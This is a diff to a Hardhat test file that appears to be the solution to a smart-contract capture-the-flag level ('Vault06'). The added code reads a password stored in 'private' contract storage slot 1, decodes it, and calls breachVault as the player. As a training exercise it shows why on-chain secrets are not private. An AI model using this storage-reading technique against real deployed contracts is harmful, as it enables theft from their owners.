@@ -29,8 +29,14 @@ describe("Vault06 Test Suite", function () {
 
         // =========================
         // YOUR CODE GOES HERE
-        // Use only player account 
-        // await vault.connect(player).lockInPassword(<PASSWORD>);
+        // Use player account to call unlock with the correct value
+        // Read the storage slot value (32 bytes)
+        let slotValue = await ethers.provider.getStorage(vault.target, 1);
+        // Replace the last byte with 0x00 so that it becomes a valid bytes32 string:
+        slotValue = slotValue.substring(0, slotValue.length - 2) + "00";
+        const password = ethers.decodeBytes32String(slotValue);
+        console.log("Storage value at slot", 1, ":", password);
+        await vault.connect(player).breachVault(password);
         // =========================
 
         /** SUCCESS CONDITIONS - DO NOT CHANGE ANYTHING HERE */
